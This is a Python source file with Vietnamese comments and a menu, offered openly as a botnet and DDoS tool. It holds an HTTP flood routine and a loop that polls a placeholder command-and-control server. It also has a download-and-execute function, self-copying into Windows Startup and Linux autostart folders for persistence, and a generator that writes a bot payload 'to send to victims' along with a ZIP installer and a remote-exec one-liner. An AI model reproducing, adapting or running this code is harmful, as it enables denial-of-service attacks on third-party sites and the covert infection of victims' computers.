# botnet_deployer.py - Tạo file botnet tự phát tán dạng tải xuống
import requests
import concurrent.futures
import time
import random
import logging
import os
import sys
import subprocess
import platform
import json
import base64
from itertools import cycle
from urllib.parse import urlparse

# ==================== CẤU HÌNH BOTNET ====================
C2_SERVER = "https://your-c2-server.com"  # Thay bằng C2 thật
BOT_ID = f"{platform.node()}_{os.getpid()}_{random.randint(1000,9999)}"

MIN_DELAY = 0.05
MAX_DELAY = 0.3

# ==================== TẢI USER-AGENTS TỪ GITHUB ====================
UA_URL = "https://raw.githubusercontent.com/nbinh5341-dot/binh-dep-trai/main/user-agent.txt"

def fetch_user_agents():
    try:
        resp = requests.get(UA_URL, timeout=5)
        agents = [line.strip() for line in resp.text.split('\n') if line.strip()]
        return agents if agents else ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
    except:
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

# ==================== TẤN CÔNG DDoS ====================
def ddos_attack(target_url, duration_seconds=60):
    """Tham gia tấn công DDoS vào target"""
    user_agents = fetch_user_agents()
    ua_cycle = cycle(user_agents)
    end_time = time.time() + duration_seconds
    count = 0
    
    print(f"[BOT {BOT_ID}] Bắt đầu DDoS {target_url} trong {duration_seconds}s")
    
    while time.time() < end_time:
        try:
            delay = random.uniform(MIN_DELAY, MAX_DELAY)
            headers = {
                "User-Agent": next(ua_cycle),
                "Accept": "*/*",
                "Cache-Control": "no-cache"
            }
            resp = requests.get(target_url, headers=headers, timeout=3)
            count += 1
            if count % 50 == 0:
                print(f"[BOT] Đã gửi {count} requests, status={resp.status_code}")
            time.sleep(delay)
        except:
            pass
    
    print(f"[BOT {BOT_ID}] Hoàn thành {count} requests")

# ==================== TỰ LÂY NHIỄM (DOWNLOADER) ====================
def download_and_execute(url, filename):
    """Tự tải và chạy file từ URL"""
    try:
        resp = requests.get(url, timeout=10)
        with open(filename, 'wb') as f:
            f.write(resp.content)
        os.chmod(filename, 0o755)
        if platform.system() == "Windows":
            os.system(f"start {filename}")
        else:
            os.system(f"python3 {filename} &")
        return True
    except:
        return False

def replicate_to_startup():
    """Tự sao chép vào startup để tồn tại reboot"""
    script_path = os.path.abspath(__file__)
    if platform.system() == "Windows":
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        dest = os.path.join(startup, "system_helper.py")
    else:
        dest = os.path.expanduser("~/.config/autostart/botnet.py")
        os.makedirs(os.path.dirname(dest), exist_ok=True)
    
    if not os.path.exists(dest):
        with open(script_path, 'r') as src:
            with open(dest, 'w') as dst:
                dst.write(src.read())
        print(f"[REPLICATE] Đã copy vào {dest}")

# ==================== GIAO TIẾP VỚI C2 ====================
def connect_c2():
    """Nhận lệnh từ C2 server"""
    try:
        # Đăng ký bot
        register = requests.post(f"{C2_SERVER}/register", json={"bot_id": BOT_ID}, timeout=5)
        
        while True:
            # Nhận lệnh
            cmd_resp = requests.get(f"{C2_SERVER}/command/{BOT_ID}", timeout=10)
            if cmd_resp.status_code == 200:
                cmd = cmd_resp.json()
                if cmd["type"] == "ddos":
                    ddos_attack(cmd["target"], cmd.get("duration", 60))
                elif cmd["type"] == "download_and_run":
                    download_and_execute(cmd["url"], cmd["filename"])
                elif cmd["type"] == "update":
                    download_and_execute(cmd["url"], __file__)
            time.sleep(5)
    except:
        pass

# ==================== TẠO FILE TẢI XUỐNG (PAYLOAD GENERATOR) ====================
def generate_payload(output_file="botnet_payload.py"):
    """Tạo file payload có thể gửi cho nạn nhân"""
    
    # Mã nguồn thu gọn (obfuscated nhẹ)
    payload_code = '''
import requests,os,time,random,threading,subprocess,platform
C2="''' + C2_SERVER + '''"
BID=platform.node()+str(os.getpid())
UA=["Mozilla/5.0","Chrome/120","Edge/120"]
def atk(url):
    while True:
        try:
            r=requests.get(url,headers={"User-Agent":random.choice(UA)})
            print(f"atk {r.status_code}")
        except:pass
def reg():
    try:requests.post(f"{C2}/reg",json={"id":BID})
    except:pass
def loop():
    while True:
        try:
            c=requests.get(f"{C2}/cmd/{BID}",timeout=5)
            if c.status_code==200:
                j=c.json()
                if j["t"]=="ddos":threading.Thread(target=atk,args=(j["url"],)).start()
        except:pass
        time.sleep(3)
reg()
threading.Thread(target=loop).start()
# Self-replicate
p=os.path.abspath(__file__)
if platform.system()=="Windows":
    d=os.path.join(os.getenv("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup","sys.py")
else:
    d=os.path.expanduser("~/.config/autostart/bot.py")
    os.makedirs(os.path.dirname(d),exist_ok=True)
if not os.path.exists(d):
    with open(p) as s:open(d,'w').write(s.read())
'''
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(payload_code)
    
    print(f"[✓] Đã tạo payload: {output_file}")
    print(f"[✓] Dung lượng: {len(payload_code)} bytes")
    return output_file

def create_zip_with_payload(payload_file, zip_name="botnet_installer.zip"):
    import zipfile
    with zipfile.ZipFile(zip_name, 'w') as zf:
        zf.write(payload_file)
    print(f"[✓] Đã tạo ZIP: {zip_name}")

def create_one_liner(payload_url):
    """Tạo lệnh một dòng để nạn nhân chạy"""
    one_liner = f'''python -c "import requests; exec(requests.get('{payload_url}').text)"'''
    print(f"\n[✓] One-liner command:")
    print(one_liner)
    return one_liner

# ==================== MAIN ====================
def show_menu():
    banner = """
╔══════════════════════════════════════╗
║     BOTNET DDOS TOOL - v2.0          ║
║  [1] Chạy bot (tham gia botnet)      ║
║  [2] Tạo payload (.py) để gửi nạn nhân║
║  [3] Tạo ZIP + one-liner              ║
║  [4] Tấn công DDoS ngay               ║
║  [5] Tự replicate vào startup         ║
╚══════════════════════════════════════╝
"""
    print(banner)

if __name__ == "__main__":
    show_menu()
    choice = input("Chọn chức năng (1-5): ")
    
    if choice == "1":
        print("[BOTNET] Đang chạy...")
        replicate_to_startup()
        # Chạy bot loop
        try:
            connect_c2()
        except:
            while True:
                time.sleep(10)
    
    elif choice == "2":
        payload_file = generate_payload("botnet_payload.py")
        print(f"\nFile đã tạo: {payload_file}")
        print("Cách gửi: Upload lên hosting (GitHub, Dropbox, transfer.sh)")
    
    elif choice == "3":
        payload = generate_payload("botnet_payload.py")
        create_zip_with_payload(payload)
        # Giả sử upload lên hosting, thay URL thật
        dummy_url = "https://your-server.com/botnet_payload.py"
        create_one_liner(dummy_url)
    
    elif choice == "4":
        target = input("URL target: ")
        duration = int(input("Thời gian (giây): "))
        ddos_attack(target, duration)
    
    elif choice == "5":
        replicate_to_startup()
        print("Đã copy vào startup")
    
    else:
        print("Chọn lại")
